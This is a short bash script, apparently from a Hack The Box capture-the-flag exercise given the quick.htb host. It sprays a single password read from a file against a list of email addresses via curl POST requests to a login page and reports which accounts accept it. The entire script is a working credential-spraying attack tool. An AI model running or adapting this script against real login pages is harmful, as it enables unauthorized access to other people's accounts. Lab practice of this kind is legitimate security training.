#!/bin/bash

pass=`cat portal/pw.txt`

while read e; do
  res=$(curl -s -X POST http://quick.htb:9001/login.php -d "email=$e&password=$pass")
  if [[ "$res" != *"Invalid Credentials"* ]]; then
    echo "[+] Creds found for $e"
  fi
done < portal/emails.txt
